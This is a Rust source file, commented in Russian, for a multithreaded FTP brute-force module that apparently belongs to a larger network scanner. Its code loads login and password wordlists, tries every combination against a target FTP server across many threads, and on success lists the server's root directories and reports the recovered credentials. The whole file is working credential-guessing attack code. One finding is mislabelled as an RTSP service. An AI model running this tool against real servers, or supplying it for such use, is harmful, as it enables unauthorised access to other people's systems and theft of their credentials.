use std::{
    collections::VecDeque,
    io::{Read, Write},
    net::{TcpStream, SocketAddr},
    sync::{Arc, Mutex},
    thread,
    time::Duration,
};

use crate::model::{FindingKind, ServerMessage, Finding};
use super::{BruteforceModule, BruteforceConfig, load_wordlist};
use tokio::sync::mpsc::UnboundedSender;
use tokio::sync::Semaphore;
use once_cell::sync::Lazy;
use tracing::{error};
use crate::export::update_html_event;

// Разрешаем максимум 3 одновременных FTP-брутфорса.
// Остальные вызовы start_bruteforce будут ждать свободного слота.
static FTP_BRUTE_SEMAPHORE: Lazy<Semaphore> = Lazy::new(|| Semaphore::new(3));

pub struct FTPBruteforceModule {
    tx: UnboundedSender<String>,
    config: BruteforceConfig,
}

impl FTPBruteforceModule {
    pub fn new(tx: UnboundedSender<String>, config: BruteforceConfig) -> Self {
        Self { tx, config }
    }
}

impl BruteforceModule for FTPBruteforceModule {
    fn name(&self) -> &'static str {
        "ftp"
    }

    fn supports(&self, service_kind: FindingKind) -> bool {
        matches!(service_kind, FindingKind::FtpService)
    }

    fn start_bruteforce(&self, addr: SocketAddr, banner: String) {
        if !self.config.enabled {
            return;
        }

        let tx = self.tx.clone();
        let config = self.config.clone();

        // Запускаем задачу, но внутри неё сначала ждём свободный слот семафора.
        tokio::spawn(async move {
            // <- вот тут очередь: если уже 3 брута идут, этот .await висит,
            // пока один из предыдущих не освободит permit.
            let _permit = FTP_BRUTE_SEMAPHORE
                .acquire()
                .await
                .expect("semaphore closed");

            let (usernames, passwords) = match load_wordlists(&config).await {
                Some((u, p)) => (u, p),
                None => return,
            };

            let target_ip = addr.ip().to_string();
            let target_port = addr.port();

            // Синхронный брут в blocking-треде
            let results: Vec<FtpResult> = match tokio::task::spawn_blocking(move || {
                // Можешь оставить 10, но можно и локально ограничить:
                brute_force_ftp(target_ip, target_port, usernames, passwords, 20)
            })
            .await
            {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("ftp bruteforce task panicked: {e}");
                    return;
                }
            };

            // Как только async-блок заканчивается, _permit дропается,
            // и один слот в семафоре освобождается.

            for res in results {
                let finding = Finding {
                    addr: addr.to_string(),
                    kind: FindingKind::RtspService,
                    title: Some("FTP Access".to_string()),
                    details: Some(format!(
                        "Credentials found: {}:{}",
                        res.username, res.password
                    )),
                };

                if let Err(e) = update_html_event(&addr, Some(&finding)) {
                    error!("Не удалось дописать HTML-лог: {e}");
                    let msg = ServerMessage::Error {
                        error: format!("Не удалось дописать HTML-лог: {e}"),
                    };
                    let _ = tx.send(serde_json::to_string(&msg).unwrap());
                }

                if let Ok(msg) = serde_json::to_string(&ServerMessage::Finding { finding }) {
                    let _ = tx.send(msg);
                }
            }
        });
    }
}

#[derive(Clone)]
pub struct FtpConfig {
    pub target_ip: String,
    pub target_port: u16,
    pub threads: usize,
    pub sleep_time_ms: u64,
    pub connect_timeout_secs: u64,
    pub read_timeout_secs: u64,
}

#[derive(Debug, Clone)]
pub struct FtpResult {
    pub username: String,
    pub password: String,
    pub banner: String,
    pub root_dirs: Vec<String>,
}

// ====================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========================

fn read_ftp_response(stream: &mut TcpStream) -> std::io::Result<String> {
    let mut buf = [0u8; 1024];
    let mut data = Vec::new();

    // Простой вариант: читаем пока есть данные или таймаут/EOF
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    loop {
        match stream.read(&mut buf) {
            Ok(0) => break, // EOF
            Ok(n) => {
                data.extend_from_slice(&buf[..n]);
                if n < buf.len() {
                    // скорее всего ответ уже закончился
                    break;
                }
            }
            Err(e) => {
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut
                {
                    break;
                } else {
                    return Err(e);
                }
            }
        }
    }

    Ok(String::from_utf8_lossy(&data).to_string())
}

/// Возвращает (код, полный ответ)
fn send_cmd(stream: &mut TcpStream, cmd: &str) -> std::io::Result<(u16, String)> {
    let mut line = String::from(cmd);
    if !line.ends_with("\r\n") {
        line.push_str("\r\n");
    }
    stream.write_all(line.as_bytes())?;
    let resp = read_ftp_response(stream)?;

    // FTP-код - первые 3 символа первой строки
    let code = resp
        .lines()
        .next()
        .and_then(|l| l.get(0..3))
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);

    Ok((code, resp))
}

/// Парсинг ответа 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
fn parse_pasv_port(resp: &str) -> Option<u16> {
    let start = resp.find('(')?;
    let end = resp.find(')')?;
    let inside = &resp[start + 1..end];
    let parts: Vec<_> = inside.split(',').collect();
    if parts.len() != 6 {
        return None;
    }
    let p1: u16 = parts[4].trim().parse().ok()?;
    let p2: u16 = parts[5].trim().parse().ok()?;
    Some(p1 * 256 + p2)
}

/// Получаем список директорий в корне через PASV + LIST /
fn fetch_root_dirs(
    config: &FtpConfig,
    ctrl_stream: &mut TcpStream,
) -> std::io::Result<Vec<String>> {
    // Пассивный режим
    let (code_pasv, resp_pasv) = send_cmd(ctrl_stream, "PASV")?;
    if code_pasv != 227 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("PASV failed: {}", resp_pasv.lines().next().unwrap_or("")),
        ));
    }

    let data_port = parse_pasv_port(&resp_pasv).ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidData, "Failed to parse PASV response")
    })?;

    let data_addr = format!("{}:{}", config.target_ip, data_port);
    let mut data_stream = TcpStream::connect_timeout(
        &data_addr
            .parse()
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidInput, e))?,
        Duration::from_secs(config.connect_timeout_secs),
    )?;
    data_stream.set_read_timeout(Some(Duration::from_secs(
        config.read_timeout_secs,
    )))?;

    // LIST корня
    let (code_list, resp_list) = send_cmd(ctrl_stream, "LIST /")?;
    if code_list != 150 && code_list != 125 {
        // 150 File status okay; about to open data connection.
        // 125 Data connection already open; transfer starting.
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("LIST failed: {}", resp_list.lines().next().unwrap_or("")),
        ));
    }

    // Читаем дамп директории с data-сокета
    let mut listing_buf = Vec::new();
    data_stream.read_to_end(&mut listing_buf)?;
    let listing = String::from_utf8_lossy(&listing_buf);

    // Завершающий ответ на LIST (обычно 226)
    let _ = read_ftp_response(ctrl_stream);

    // Простейший парсер UNIX-подобного LIST: строки 'd...... name'
    let mut dirs = Vec::new();
    for line in listing.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        // klassische drwxr-xr-x ...
        if line.starts_with('d') {
            // возьмём последнее "слово" как имя
            if let Some(name) = line.split_whitespace().last() {
                dirs.push(name.to_string());
            }
        }
    }

    Ok(dirs)
}

// ========================= РАБОЧИЙ ПОТОК ================================

fn ftp_worker(
    config: FtpConfig,
    work_queue: Arc<Mutex<VecDeque<(String, String)>>>,
    results: Arc<Mutex<Vec<FtpResult>>>,
    worker_id: usize,
) {
    loop {
        let (username, password) = match {
            let mut q = work_queue.lock().unwrap();
            q.pop_front()
        } {
            Some(p) => p,
            None => break,
        };

        if username.is_empty() {
            continue;
        }

        let addr = format!("{}:{}", config.target_ip, config.target_port);
        let conn_res = TcpStream::connect_timeout(
            &addr
                .parse()
                .expect("invalid target address"),
            Duration::from_secs(config.connect_timeout_secs),
        );

        let mut stream = match conn_res {
            Ok(s) => s,
            Err(e) => {
                thread::sleep(Duration::from_millis(config.sleep_time_ms));
                continue;
            }
        };

        let _ = stream.set_read_timeout(Some(Duration::from_secs(
            config.read_timeout_secs,
        )));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(
            config.read_timeout_secs,
        )));

        // баннер
        let banner = match read_ftp_response(&mut stream) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("[Worker {}] Read banner error: {}", worker_id, e);
                continue;
            }
        };

        // USER
        let (code_user, resp_user) = match send_cmd(&mut stream, &format!("USER {}", username)) {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[Worker {}] USER {} error: {}", worker_id, username, e);
                continue;
            }
        };

        if code_user == 331 {
            // Требуется пароль
            let (code_pass, _resp_pass) =
                match send_cmd(&mut stream, &format!("PASS {}", password)) {
                    Ok(r) => r,
                    Err(e) => {
                        eprintln!(
                            "[Worker {}] PASS for {} error: {}",
                            worker_id, username, e
                        );
                        continue;
                    }
                };

            if code_pass == 230 {
                println!(
                    "[Worker {}] Found valid FTP credentials: {}:{}",
                    worker_id, username, password
                );

                // Успешный логин: пробуем снять список корня
                let root_dirs = match fetch_root_dirs(&config, &mut stream) {
                    Ok(list) => list,
                    Err(e) => {
                        eprintln!(
                            "[Worker {}] Failed to list root dirs for {}:{} – {}",
                            worker_id, username, password, e
                        );
                        Vec::new()
                    }
                };

                let result = FtpResult {
                    username: username.clone(),
                    password: password.clone(),
                    banner: banner.clone(),
                    root_dirs,
                };

                results.lock().unwrap().push(result);
            }
        } else if code_user == 230 {
            // Некоторые FTP могут логинить сразу по USER без пароля
            println!(
                "[Worker {}] FTP allows login without password for user {}",
                worker_id, username
            );

            let root_dirs = match fetch_root_dirs(&config, &mut stream) {
                Ok(list) => list,
                Err(e) => {
                    eprintln!(
                        "[Worker {}] Failed to list root dirs for {} (no-pass) – {}",
                        worker_id, username, e
                    );
                    Vec::new()
                }
            };

            let result = FtpResult {
                username: username.clone(),
                password: String::new(),
                banner: banner.clone(),
                root_dirs,
            };

            results.lock().unwrap().push(result);
        } else {
            // USER отвергнут (530, 5xx и т.п.)
            // Можно залогировать при желании
            // eprintln!("[Worker {}] USER {} rejected: {}", worker_id, username, resp_user.lines().next().unwrap_or(""));
            let _ = resp_user;
        }

        thread::sleep(Duration::from_millis(config.sleep_time_ms));
    }
}

// ========================== ПУБЛИЧНЫЙ API ===============================

/// Супербыстрый многопоточный брут FORCE для FTP:
/// - target_ip, target_port
/// - списки логинов и паролей
/// - threads: количество потоков
///
/// Возвращает вектор успешных логинов с баннером и списком директорий в корне.
pub fn brute_force_ftp(
    target_ip: String,
    target_port: u16,
    usernames: Vec<String>,
    passwords: Vec<String>,
    threads: usize,
) -> Vec<FtpResult> {
    let config = FtpConfig {
        target_ip,
        target_port,
        threads,
        sleep_time_ms: 20,
        connect_timeout_secs: 1,
        read_timeout_secs: 5,
    };

    // Очередь комбинаций
    let work_queue = Arc::new(Mutex::new(VecDeque::new()));
    let results = Arc::new(Mutex::new(Vec::new()));

    {
        let mut q = work_queue.lock().unwrap();
        for user in &usernames {
            for pass in &passwords {
                if !user.is_empty() {
                    q.push_back((user.clone(), pass.clone()));
                }
            }
        }
    }

    let total = work_queue.lock().unwrap().len();
    if total == 0 {
        println!("[-] No FTP username/password combinations to test");
        return Vec::new();
    }

    println!(
        "[*] Starting FTP brute force with {} combinations ({} threads)",
        total, config.threads
    );

    // Запуск потоков
    let mut handles = Vec::new();
    for i in 0..config.threads {
        let cfg = config.clone();
        let q = Arc::clone(&work_queue);
        let r = Arc::clone(&results);
        let h = thread::spawn(move || ftp_worker(cfg, q, r, i));
        handles.push(h);
    }

    // Простейший мониторинг
    let start = std::time::Instant::now();
    let mut last_done = 0;

    for h in handles {
        let _ = h.join();
    }

    println!("[*] FTP brute force completed");

    let out = {
        let guard = results.lock().unwrap();
        guard.clone()
    };

    out
}

async fn load_wordlists(config: &BruteforceConfig) -> Option<(Vec<String>, Vec<String>)> {
    let usernames = load_wordlist(&"ftplogin.txt".to_string()).await.ok()?;
    let passwords = load_wordlist(&"ftppass.txt".to_string()).await.ok()?;
    
    if usernames.is_empty() || passwords.is_empty() {
        None
    } else {
        Some((usernames, passwords))
    }
}